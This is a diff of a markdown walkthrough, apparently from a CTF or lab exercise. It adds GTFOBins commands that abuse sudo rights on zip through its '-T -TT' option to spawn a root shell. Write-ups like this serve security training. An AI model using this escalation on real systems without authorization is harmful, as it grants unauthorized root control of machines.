@@ -191,7 +191,14 @@ sudo -l
 So the above means we can run zip as root
 
 So goto GTFOBINS
-https://gtfobins.github.io/![image](https://user-images.githubusercontent.com/66864342/160245438-4d4bc4ea-58f1-44ba-83e5-481b24066caf.png)
+https://gtfobins.github.io/
+
+type commands one line at a time
+```markdown
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+```
 
 
 
